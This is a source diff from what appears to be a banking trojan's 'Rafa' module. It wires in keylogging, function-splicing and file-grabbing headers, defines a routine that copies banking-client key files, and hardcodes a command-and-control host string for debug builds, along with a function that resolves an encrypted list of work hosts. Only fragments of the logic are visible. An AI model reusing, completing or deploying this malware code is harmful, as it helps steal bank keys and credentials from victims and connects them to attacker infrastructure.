@@ -1,27 +1,30 @@
-#include "Modules.h"
+#ifndef RafaH
+	#error Exclude module from project
+#endif
 
-#if defined(RafaH) || defined(BBSCBankH) || defined(IFobsH)
 
-	static char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;
 
-	PCHAR Rafa::Hosts()
-	{
-		return RAFA_HOSTS;   
-	}
+//#if defined(RafaH) || defined(BBSCBankH) || defined(IFobsH)
+//	#deine USE_RAFA_HOSTS
+//#endif
 
+
+//#ifdef USE_RAFA_HOSTS
+//	char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;
+//#endif
+
+
+#ifndef DEBUGCONFIG
+	char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;
 #else
-namespace Rafa
-{
-	PCHAR Hosts()
-	{
-		return NULL;
-	}
-}
-#endif //RafaH || BBSCBankH
+    char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = "az.zika.in\0\0";
+#endif
 
-#ifdef RafaH
+
+
+//#ifdef RafaH
 //****************************************************************************
-
+#include <Windows.h>
 
 #include "GetApi.h"
 #include "KeyLogSystems.h"
@@ -29,6 +32,7 @@ namespace Rafa
 #include "Utils.h"
 #include "Splice.h"
 #include "rafa.h"
+#include "Config.h"
 #include "FileGrabber.h"
 
 #include "RafaDll.cpp"
@@ -73,6 +77,11 @@ namespace Rafa {
 	}
 */
 
+#ifndef INT_MAX
+	#define INT_MAX       2147483647
+#endif
+
+
 	void CopyRafaKeyFiles(LPVOID Sender)
 	{
 		DBG( "Rafa", "Активирована" );
@@ -111,4 +120,25 @@ namespace Rafa {
 }
 
 
-#endif  //RafaH
+//=============================================================================
+//#endif  //RafaH
+
+
+
+PCHAR Rafa::Hosts()
+{
+//	#ifdef USE_RAFA_HOSTS
+//		return RAFA_HOSTS;
+//	#else
+//		return NULL;
+//	#endif
+
+	return RAFA_HOSTS;
+}
+
+
+
+string Rafa::GetWorkHost()
+{
+	return GetActiveHostFromBuf2(RAFA_HOSTS, 0, RAFAHOSTS_PARAM_ENCRYPTED);
+}
